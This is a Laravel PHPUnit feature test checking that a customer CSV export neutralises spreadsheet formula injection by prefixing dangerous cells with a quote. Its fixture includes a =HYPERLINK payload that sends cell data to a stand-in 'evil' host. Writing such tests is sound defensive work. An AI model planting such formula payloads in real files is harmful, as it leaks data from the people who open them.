<?php

namespace Tests\Feature;

use App\Models\Customer;
use App\Models\Tenant;
use App\Models\User;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

/**
 * M-8: a customer whose name is entered as `=HYPERLINK(...)` or any other
 * formula prefix will run that expression when an admin opens the CSV
 * export in Excel / LibreOffice / Google Sheets. The export must prefix
 * such cells with a leading single quote so the spreadsheet renders the
 * value as literal text.
 */
class CsvExportInjectionTest extends TestCase
{
    use RefreshDatabase;

    #[Test]
    public function csv_export_neutralizes_formula_prefixes_in_customer_fields(): void
    {
        $this->seed(RolesAndPermissionsSeeder::class);

        $tenant = Tenant::factory()->create();
        $admin = User::factory()->create([
            'tenant_id' => $tenant->id,
            'email_verified_at' => now(),
        ]);
        $admin->assignRole('admin');

        Customer::factory()->create([
            'tenant_id' => $tenant->id,
            'name' => '=HYPERLINK("http://evil/?t="&A1,"Click")',
            'email' => '+15551234567@example.com',
            'phone' => '@SUM(A1:A2)',
        ]);

        $response = $this->actingAs($admin)->get(route('management.export'));

        $response->assertOk();
        $body = $response->streamedContent();

        // Every dangerous leading character must be preceded by a single quote.
        $this->assertStringContainsString("'=HYPERLINK", $body);
        $this->assertStringContainsString("'+15551234567@example.com", $body);
        $this->assertStringContainsString("'@SUM(A1:A2)", $body);

        // And raw formula prefixes should not appear at the start of a cell.
        // fputcsv delimits with commas, so search for ",=" / ",@" / ",+" / ",-".
        $this->assertDoesNotMatchRegularExpression('/,=[A-Z]/', $body);
        $this->assertDoesNotMatchRegularExpression('/,@[A-Z]/', $body);
    }
}
